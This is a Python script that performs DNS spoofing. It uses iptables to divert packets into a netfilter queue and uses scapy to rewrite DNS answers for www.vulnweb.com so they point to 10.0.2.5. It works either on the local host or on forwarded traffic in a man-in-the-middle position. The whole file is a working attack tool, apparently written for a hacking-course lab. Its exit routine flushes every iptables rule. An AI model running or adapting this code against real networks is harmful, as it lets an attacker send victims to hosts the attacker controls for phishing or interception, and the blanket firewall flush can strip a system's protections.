#!/usr/bin/env python

import netfilterqueue
import subprocess
from optparse import OptionParser
import scapy.all as scapy


def process(packets):
    scapy_packets = scapy.IP(packets.get_payload())
    if scapy_packets.haslayer(scapy.DNSRR):
        qname = scapy_packets[scapy.DNSQR].qname
        if "www.vulnweb.com" in qname:
            print("[+] Spoofing target")
            scapy_packets[scapy.DNS].an = scapy.DNSRR(rrname = qname, rdata ="10.0.2.5")
            scapy_packets[scapy.DNS].ancount = 1
            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].len
            del scapy_packets[scapy.UDP].chksum
            packets.set_payload(str(scapy_packets))
    packets.accept()

def QueueIpMY(num):
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", num])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", num])

def QueueIpOTHER(num):
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", num])

def DequeueIp():
    subprocess.call(["iptables","-F"])

def get_value():
    parse =OptionParser()
    parse.add_option("-n", "--num", dest="num", help="Enter the queue number using -n or -num")
    parse.add_option("-o", "--operatingsys", dest="OS", help="Enter whose network want to cut (kali/other)")
    (value,other) = parse.parse_args()
    if not value.num:
        parse.error("[-] Please specify the number")
    elif not value.OS:
        parse.error("[-] Please specify the os(kali/other)")
    return value

def configure(num):

    if num.OS in "kali":
        QueueIpMY(num.num)
    else:
        QueueIpOTHER(num.num)


try:
    num = get_value()
    configure(num)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(num.num),process)
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting the process and flushing the table")
    DequeueIp()
